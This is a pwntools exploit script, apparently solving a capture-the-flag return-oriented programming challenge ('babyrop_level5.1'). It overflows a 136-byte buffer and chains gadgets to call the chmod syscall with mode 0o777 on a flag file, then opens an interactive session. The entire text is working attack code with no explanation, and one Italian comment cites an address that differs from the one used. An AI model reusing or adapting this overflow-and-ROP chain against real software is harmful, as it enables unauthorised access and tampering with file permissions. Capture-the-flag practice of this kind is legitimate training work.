from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level5.1")

io = elf.process()

buffer_len = 136
rop = ROP(elf)
rop.rax = p64(0x5a)
rop.rdi = p64(0x403099) # Indirizzo stringa cs_open (x/s 0x40081)
rop.rsi = 0o777
rop.raw(rop.syscall)
PAYLOAD = b'/flag\x00' + b'A'*(buffer_len-len(b'/flag\x00')) + rop.chain()
io.send(PAYLOAD)

io.interactive()
